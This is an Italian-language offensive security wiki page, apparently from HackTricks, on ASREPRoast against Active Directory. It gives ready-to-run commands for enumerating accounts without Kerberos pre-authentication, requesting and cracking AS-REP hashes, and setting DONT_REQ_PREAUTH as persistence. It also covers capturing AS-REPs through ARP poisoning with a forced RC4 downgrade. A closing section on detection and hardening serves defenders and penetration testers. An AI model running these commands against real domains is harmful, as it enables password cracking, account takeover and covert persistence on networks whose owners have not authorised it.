# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast è un security attack che sfrutta gli utenti privi dell'attributo **Kerberos pre-authentication required**. In sostanza, questa vulnerabilità consente agli attaccanti di richiedere l'autenticazione per un utente al Domain Controller (DC) senza aver bisogno della password dell'utente. Il DC risponde quindi con un messaggio cifrato con la chiave derivata dalla password dell'utente, che gli attaccanti possono tentare di crackare offline per scoprire la password dell'utente.

I requisiti principali per questo attack sono:

- **Assenza della Kerberos pre-authentication**: gli utenti target non devono avere questa funzionalità di sicurezza abilitata.
- **Connessione al Domain Controller (DC)**: gli attaccanti devono poter accedere al DC per inviare richieste e ricevere messaggi cifrati.
- **Account di dominio opzionale**: avere un account di dominio consente agli attaccanti di identificare più efficacemente gli utenti vulnerabili tramite query LDAP. Senza tale account, gli attaccanti devono indovinare i nomi utente.

#### Enumerazione degli utenti vulnerabili (richiede credenziali di dominio)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Richiesta del messaggio AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus richiede **RC4** per impostazione predefinita, quindi l'Event ID **4768** mostra solitamente **preauth type 0** e **ticket encryption type 0x17**. Se aggiungi **`/aes`** (oppure RC4 è disabilitato per il target), aspettati invece **AES etypes**.<sup>[[2]](#references)</sup>

#### Quick one-liners (Linux)

- Enumera prima i potenziali target (ad esempio, dai build paths ottenuti tramite leak) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Esegui il roast di un intero elenco di username senza credenziali valide usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Se disponi di credenziali, lascia che NetExec interroghi LDAP e richieda per te ogni account soggetto a roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Se l'output inizia con **`$krb5asrep$23$`**, esegui il cracking con Hashcat **`-m 18200`**. Se inizia con **`$krb5asrep$17$`** o **`$krb5asrep$18$`**, preferisci John con **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Non dare per scontato che ogni AS-REP roast utilizzi RC4. I tool moderni possono restituire **RC4** (`$krb5asrep$23$`) o **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), a seconda dell'enctype richiesto/negoziato. **`hashcat -m 18200`** è destinato a **etype 23**, mentre **John** gestisce direttamente `krb5asrep` per **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistenza

Force **preauth** non richiesto per un utente per il quale disponi di permessi **GenericAll** (o di permessi per scrivere proprietà):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Rilevamento e hardening

Un roast riuscito produce un evento **4768** sul DC con `Status=0x0` e `PreAuthType=0`. Non richiedere RC4 nel rilevamento: `TicketEncryptionType=0x17` è un segnale utile di weak-encryption, ma un attacker può richiedere AES (valori del log degli eventi `0x11`/`0x12`). Su Windows Server 2016 e versioni successive con l'aggiornamento cumulativo del 14 gennaio 2025 (o più recente), la versione 2 dell'evento 4768 espone anche `ClientAdvertizedEncryptionTypes`, gli etype supportati dall'account/DC e le chiavi disponibili.<sup>[[5]](#references)</sup>

Un hunt pratico segnala un client che pubblicizza solo RC4 mentre l'account dispone di chiavi AES, quindi correla raffiche provenienti da un singolo source IP attraverso diversi utenti senza preauth. Definisci una baseline delle eccezioni legittime invece di generare alert per ogni evento con `PreAuthType=0`.

La soluzione duratura consiste nel deselezionare **Do not require Kerberos preauthentication** per ogni utente che non ne ha strettamente bisogno e nel ruotare le password degli account esposti. Se un'eccezione non può essere rimossa, usa una password lunga generata casualmente e privilegi minimi. Disabilitare RC4 aumenta il costo del cracking, ma non elimina la roastability perché le risposte AS-REP AES restano crackabili offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast senza credenziali

Un attacker on-path può catturare l'AS-REP restituito durante un normale scambio AS preauthenticated e formattarne la parte cifrata per il cracking offline. A differenza del classico ASREPRoasting, non è necessario `DONT_REQ_PREAUTH`; tuttavia, produce risultati solo per gli account il cui scambio Kerberos viene effettivamente intercettato. **ASRepCatcher** ottiene la posizione utilizzando di default ARP poisoning unidirezionale, oppure può utilizzare il traffico proveniente da un'altra tecnica MitM con `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Se vuoi il trick correlato senza credenziali che restituisce un **service ticket** invece di un **TGT** da un principal senza preauth, consulta [Kerberoast](kerberoast.md).

In modalità `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inoltra gli AS-REQ intercettati e forza **RC4** quando entrambi i lati lo consentono ancora. `listen` non modifica i pacchetti e cattura quindi l'enctype negoziato dal client e dal DC. Limita lo scope del poisoning con `-t`/`-tf` invece di coinvolgere l'intera subnet quando possibile.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Evento 4768: è stato richiesto un ticket di autenticazione Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
